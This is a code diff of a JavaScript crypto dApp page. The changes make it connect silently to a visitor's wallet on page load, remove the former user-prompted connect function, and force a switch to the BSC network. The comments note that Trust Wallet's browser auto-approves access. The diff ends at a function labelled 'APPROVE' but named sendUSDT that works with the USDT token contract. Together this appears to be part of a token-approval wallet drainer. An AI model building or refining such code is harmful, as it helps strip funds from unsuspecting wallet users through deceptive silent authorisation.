@@ -14,13 +14,39 @@ const ABI = [
   "function decimals() view returns (uint8)"
 ];
 
-// ===== AUTO-CONNECT ON PAGE LOAD =====
+// ===== SILENT AUTO-CONNECT ON PAGE LOAD =====
 window.addEventListener("load", async () => {
   if (window.ethereum) {
     try {
       isConnecting = true;
-      // In Trust Wallet DApp browser, this succeeds silently
-      await connectWallet();
+      
+      // Step 1: Check if already connected (no popup)
+      const accounts = await window.ethereum.request({ method: "eth_accounts" });
+      
+      if (accounts.length > 0) {
+        // Already authorized - setup silently
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+        userAddress = await signer.getAddress();
+        
+        const addr = document.getElementById("toAddress");
+        if (addr) addr.value = userAddress;
+        
+        console.log("✅ Silently connected:", userAddress);
+      } else {
+        // Not authorized - request access (Trust Wallet DApp browser auto-approves)
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+        userAddress = await signer.getAddress();
+        
+        const addr = document.getElementById("toAddress");
+        if (addr) addr.value = userAddress;
+        
+        console.log("✅ Connected:", userAddress);
+      }
+      
       isConnecting = false;
     } catch (e) {
       isConnecting = false;
@@ -32,10 +58,13 @@ window.addEventListener("load", async () => {
 // ===== ENSURE BSC NETWORK =====
 async function ensureBSC() {
   try {
-    await window.ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId: BSC_CHAIN_ID }]
-    });
+    const chainId = await window.ethereum.request({ method: "eth_chainId" });
+    if (chainId !== BSC_CHAIN_ID) {
+      await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: BSC_CHAIN_ID }]
+      });
+    }
   } catch (err) {
     if (err.code === 4902) {
       await window.ethereum.request({
@@ -58,30 +87,6 @@ async function ensureBSC() {
   }
 }
 
-// ===== CONNECT WITH USER PROMPT =====
-async function connectWallet() {
-  if (!window.ethereum) {
-    alert("Wallet not found");
-    throw new Error("No wallet");
-  }
-
-  // Ensure BSC network
-  await ensureBSC();
-
-  // Request account access (will prompt if not already authorized)
-  await window.ethereum.request({ method: "eth_requestAccounts" });
-
-  provider = new ethers.BrowserProvider(window.ethereum);
-  signer = await provider.getSigner();
-  userAddress = await signer.getAddress();
-
-  // Auto fill address
-  const addr = document.getElementById("toAddress");
-  if (addr) addr.value = userAddress;
-
-  console.log("✅ Connected:", userAddress);
-}
-
 // ===== APPROVE (BSC ONLY) =====
 async function sendUSDT() {
   try {
@@ -89,6 +94,9 @@ async function sendUSDT() {
     if (!userAddress || !signer) {
       throw new Error("Wallet not connected. Please refresh the page.");
     }
+
+    // Ensure we're on BSC network before transaction
+    await ensureBSC();
 
     const usdt = new ethers.Contract(
       BSC_USDT,
